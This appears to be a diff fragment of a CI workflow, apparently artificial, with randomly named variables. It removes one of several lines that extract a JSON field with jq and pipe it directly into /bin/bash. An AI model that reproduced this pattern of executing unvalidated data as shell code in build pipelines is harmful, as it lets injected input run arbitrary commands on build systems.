@@ -44,7 +44,6 @@ jobs:
           echo $sfkrf3528 | jq -r .y92700 | /bin/bash
           echo $pikb7856 | jq -r .erki5148 | /bin/bash
           printf '%s' "$j025" | jq -r .woceh24 | /bin/bash
-          echo $f08867 | jq -r .kno12 | /bin/bash
           echo $pki09 | jq -r .q24860 | /bin/bash
           printf '%s' "$lb6931" | jq -r .ednk311 | /bin/bash
           printf '%s' "$jbnna64" | jq -r .vgkbp7863 | /bin/bash
